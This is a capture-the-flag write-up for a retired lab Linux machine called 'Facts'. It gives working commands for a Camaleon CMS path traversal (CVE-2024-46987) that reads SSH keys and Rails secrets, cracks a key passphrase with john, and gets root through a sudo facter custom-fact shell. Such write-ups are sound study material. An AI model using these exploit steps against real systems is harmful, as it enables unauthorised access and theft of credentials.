# Facts

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--01--31-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | January 31, 2026 |
| **Rating** | 4.5 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A Camaleon CMS (Ruby on Rails) site allows self-registration, and any logged-in account can abuse **CVE-2024-46987**, a path traversal in the media download endpoint, to read arbitrary files — including the user flag and `trivia`'s encrypted SSH private key. The key's passphrase cracks with rockyou, giving SSH as `trivia`, who has a `NOPASSWD` sudo rule for `/usr/bin/facter`. Facter loads custom facts from a user-supplied directory and executes their Ruby, so a one-line custom fact spawns a root shell.

---

## Attack Chain

```
Register on CMS → CVE-2024-46987 LFI → read user.txt and trivia's SSH key
  → crack key passphrase (rockyou) → SSH as trivia
    → sudo /usr/bin/facter with a custom fact directory → root
```

---

## Recon

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Camaleon CMS (Ruby on Rails) |
| 54321 | MinIO | S3-compatible object storage |

System users:

| Username | UID | Shell | Notes |
|----------|-----|-------|-------|
| root | 0 | /bin/bash | Target for privilege escalation |
| trivia | 1000 | /bin/bash | Encrypted SSH key, MinIO bucket access |
| william | 1001 | /bin/bash | Owns the user flag |

```bash
echo "10.129.X.X facts.htb" | sudo tee -a /etc/hosts
```

---

## Step 1: Register an account on the CMS

1. Browse to `http://facts.htb/admin/register`
2. Fill out the registration form — any credentials work
3. Complete the CAPTCHA manually (this part can't be scripted)
4. Log in at `http://facts.htb/admin/login`

Registration alone is enough. The path traversal below needs *an* authenticated session, not an administrative one.

---

## Step 2: CVE-2024-46987 — Camaleon CMS path traversal

Camaleon CMS versions prior to the patch allow an authenticated user to read arbitrary files through path traversal in the media download functionality (CVSS 7.5).

The endpoint is `download_private_file`, **not** `download` — this detail cost real time:

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../home/william/user.txt
```

Or with curl, carrying the session cookie:

```bash
curl -s -b cookies.txt \
  "http://facts.htb/admin/media/download_private_file?file=../../../../../../[TARGET_FILE]"
```

### Files successfully retrieved

- `/etc/passwd` — user enumeration
- `/home/william/user.txt` — the user flag
- `/home/trivia/.ssh/id_ed25519` — encrypted SSH private key
- `/home/trivia/.ssh/authorized_keys`
- `/proc/self/cwd/config/database.yml` — SQLite configuration
- `/proc/self/cwd/config/credentials.yml.enc` — Rails encrypted credentials
- `/proc/self/cwd/config/master.key` — Rails master key
- `/proc/self/cwd/storage/production.sqlite3` — the full CMS database (1.9 MB)
- `/etc/crontab` — standard, no custom jobs

### Blocked

- `/etc/shadow` — permission denied
- `/root/.ssh/*` — permission denied
- `/var/www/facts/config/database.yml`, `/var/www/facts/.env` — outside the readable scope

---

## Step 3: Crack the SSH key passphrase

```bash
ssh2john trivia_key > trivia_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt trivia_hash.txt
```

Passphrase: `dragonballz`.

```bash
chmod 600 trivia_key
ssh -i trivia_key trivia@facts.htb
# Enter passphrase: dragonballz
```

---

## Step 4: Privilege escalation — sudo facter

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

Facter resolves "custom facts" by loading Ruby files from a directory given on the command line. Anything in those files runs with Facter's privileges — which here is root:

```bash
mkdir -p /dev/shm
echo 'Facter.add(:root) { setcode { system("/bin/bash") } }' > /dev/shm/root.rb

sudo /usr/bin/facter -p --custom-dir /dev/shm root
```

This drops straight into a root shell, from which `/root/root.txt` is readable.

---

## The MinIO Branch (explored, not needed)

The CMS database is worth dumping even though the intended path doesn't require it, and it is where most of the time went before the `facter` rule was spotted.

### Database: `production.sqlite3`

| Table | Useful data |
|-------|-------------|
| `cama_users` | Admin and test-user bcrypt hashes |
| `cama_metas` | Site configuration — **MinIO credentials**, filesystem settings |
| `cama_posts` | Trivia fact content |
| `cama_media` | Image references |
| `plugins_attacks` | Request rate limiting / GET request logs |

```sql
SELECT * FROM cama_metas WHERE id = 16;
SELECT id, username, role, email, password_digest FROM cama_users;
SELECT * FROM cama_metas WHERE key LIKE '%key%' OR key LIKE '%secret%' OR key LIKE '%pass%';
```

Row 16 of `cama_metas` holds the MinIO S3 credentials, with the `randomfacts` bucket for CMS media and an `internal` bucket on `http://localhost:54321`.

### Browsing the buckets

```bash
wget -q https://dl.min.io/client/mc/release/linux-amd64/mc -O /tmp/minio-mc
chmod +x /tmp/minio-mc

/tmp/minio-mc alias set facts http://<TARGET_IP>:54321 <ACCESS_KEY> '<SECRET_KEY>'
/tmp/minio-mc ls facts/
/tmp/minio-mc ls -r facts/internal/
```

The `internal` bucket turns out to contain a backup of `trivia`'s home directory — including the same encrypted `id_ed25519` already obtained via the LFI. Writing a new `authorized_keys` into the bucket does not help, because the bucket is a backup rather than the live home directory.

### Why this branch is a dead end

- The admin bcrypt hash from `cama_users` does not crack in any reasonable time, and it isn't needed — plain registration is enough for the LFI.
- MinIO offers no privilege escalation of its own: no admin credentials, and write access to `internal` has no effect on the running system.
- The Rails `master.key` and `secret_key_base` are recoverable, which would allow a deserialization attack, but the `facter` sudo rule makes that unnecessary.
- **The MinIO and database credentials are randomised per machine instance** — don't invest time in them.

---

## Key Vulnerabilities

| Vulnerability | CVE / Type | Impact |
|---------------|------------|--------|
| Local file inclusion | CVE-2024-46987 (Camaleon CMS) | Read arbitrary files as the web user |
| Weak SSH key passphrase | Credential weakness | SSH access as `trivia` |
| Sudo misconfiguration | GTFOBins (`facter`) | Root privilege escalation |

## Tools Used

A browser (for the registration CAPTCHA), curl, `sqlite3`, `john`/`ssh2john`, `hashcat`, and the MinIO client `mc`.

## Lessons Learned

- The LFI endpoint is `download_private_file`, not `download`. Enumerating the controller's actions rather than guessing would have found it immediately.
- Registration-level access was sufficient; time spent trying to crack the admin bcrypt hash was wasted.
- Always check `sudo -l` before building out an elaborate secondary path. The whole MinIO excursion was unnecessary once the `facter` rule was visible.
- Anything that loads user-specified plugin, fact or extension directories is a GTFOBins candidate — `facter --custom-dir` behaves exactly like the `.pth` and dstat-plugin patterns seen on other machines.

## References

- [CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)
- [Camaleon CMS](https://github.com/owen2345/camaleon-cms)
- [GTFOBins](https://gtfobins.github.io/)

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
